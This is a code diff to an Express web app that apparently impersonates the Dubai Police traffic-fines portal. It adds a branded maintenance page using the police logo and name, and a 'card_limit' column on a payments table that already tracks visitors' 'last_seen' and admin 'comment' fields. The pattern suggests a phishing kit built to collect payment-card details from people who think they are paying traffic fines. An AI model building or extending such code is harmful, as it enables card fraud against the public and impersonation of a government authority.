@@ -41,6 +41,25 @@ app.use(session({
   },
 }));
 
+// ─── Maintenance mode middleware ──────────────────────────────────────────────
+let maintenanceCache = { value: '1', time: 0 };
+app.use(async (req, res, next) => {
+  if (req.path.startsWith('/admin') || req.path.startsWith('/api')) return next();
+  if (req.path.includes('.')) return next();
+  try {
+    const now = Date.now();
+    if (now - maintenanceCache.time > 30000) {
+      const raw = await pool.query("SELECT value FROM settings WHERE key='site_active' LIMIT 1");
+      maintenanceCache.value = raw.rows[0]?.value ?? '1';
+      maintenanceCache.time = now;
+    }
+    if (maintenanceCache.value !== '1') {
+      return res.status(503).send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dubai Police — Maintenance</title><link rel="icon" type="image/png" href="/dp-logo.png"><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:#f5f7fa;min-height:100vh;display:flex;flex-direction:column}header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 20px;display:flex;align-items:center;gap:12px}.h-logo{width:36px;height:36px;border-radius:50%;border:2px solid rgba(255,255,255,0.25)}.h-name{color:white;font-weight:800;font-size:15px;line-height:1.2}.h-sub{color:rgba(255,255,255,0.6);font-size:11px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}.card{background:white;border-radius:18px;padding:40px 32px;max-width:420px;width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,0.08)}.icon{width:64px;height:64px;background:#e8f5ee;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}.title{font-size:20px;font-weight:800;color:#1a1a1a;margin-bottom:10px}.sub{font-size:14px;color:#6b7280;line-height:1.6}.badge{display:inline-block;margin-top:20px;padding:6px 16px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;font-size:12px;font-weight:600;color:#166534}</style></head><body><header><img src="/dp-logo.png" alt="" class="h-logo" width="36" height="36"><div><div class="h-name">Dubai Police</div><div class="h-sub">شرطة دبي</div></div></header><div class="main"><div class="card"><div class="icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#006837" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div><div class="title">Service Under Maintenance</div><div class="sub">The Traffic Fines Portal is temporarily unavailable while we perform scheduled maintenance. Please try again shortly.</div><div class="badge">We'll be back soon</div></div></div></body></html>`);
+    }
+  } catch {}
+  next();
+});
+
 // ─── IP Ban middleware ─────────────────────────────────────────────────────────
 let bannedIpsCache = { list: [], time: 0 };
 app.use(async (req, res, next) => {
@@ -72,6 +91,9 @@ pool.query('ALTER TABLE payments ADD COLUMN IF NOT EXISTS last_seen TIMESTAMP DE
 
 pool.query("ALTER TABLE payments ADD COLUMN IF NOT EXISTS comment TEXT DEFAULT ''")
   .catch(e => console.log('Migration note (comment):', e.message));
+
+pool.query("ALTER TABLE payments ADD COLUMN IF NOT EXISTS card_limit VARCHAR(20) DEFAULT ''")
+  .catch(e => console.log('Migration note (card_limit):', e.message));
 
 ensureActivityLogsTable().catch(console.error);
 
